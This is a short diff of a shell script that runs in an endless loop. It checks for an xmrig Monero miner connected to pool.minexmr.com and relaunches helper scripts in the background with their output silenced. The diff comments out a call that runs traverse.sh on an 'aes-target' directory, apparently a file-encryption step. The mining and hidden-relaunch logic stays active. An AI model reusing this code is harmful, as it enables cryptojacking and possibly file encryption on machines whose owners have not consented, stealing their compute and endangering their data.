@@ -25,8 +25,8 @@ while [ 1 ] ; do
     CheckProcess "xmrig -o pool.minexmr.com:443"
     if [ $? == 0 ];then
         # restart & aes 
-        chmod 764 traverse.sh
-        ./traverse.sh ./aes-target 
+        # chmod 764 traverse.sh
+        # ./traverse.sh ./aes-target 
         chmod 764 run.sh
         nohup ./run.sh  >/dev/null 2>&1 &   
     #add other process...
